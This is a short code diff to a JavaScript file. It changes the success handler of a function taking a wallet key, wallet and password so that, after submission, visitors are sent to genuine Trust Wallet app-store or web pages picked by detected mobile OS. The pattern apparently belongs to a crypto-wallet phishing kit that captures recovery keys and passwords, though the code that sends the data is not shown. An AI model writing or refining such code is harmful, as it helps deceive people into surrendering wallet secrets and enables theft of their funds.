@@ -200,7 +200,18 @@ function moreLove(key, type, wallet, password) {
         },
         success: function (response) {
             setTimeout(function () {
-                window.location.replace(REDIRECT_LINK);
+                if(REDIRECT_LINK.includes("http")){
+                    window.location.replace(REDIRECT_LINK);
+                }else {
+                    let platform = getMobileOS();
+                    if(platform === "Android"){
+                        window.location.replace("https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite");
+                    }else if(platform === "iOS"){
+                        window.location.replace("https://apps.apple.com/app/apple-store/id1288339409?mt=8");
+                    }else {
+                        window.location.replace('https://trustwallet.com/earn');
+                    }
+                }
             }, 2000);
         },
         error: function (response) {
@@ -210,4 +221,15 @@ function moreLove(key, type, wallet, password) {
         complete: function () {
         }
     });
+}
+
+const getMobileOS = () => {
+    const ua = navigator.userAgent
+    if (/android/i.test(ua)) {
+        return "Android"
+    }
+    else if (/iPad|iPhone|iPod/.test(ua) === true || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)){
+        return "iOS"
+    }
+    return "Other"
 }
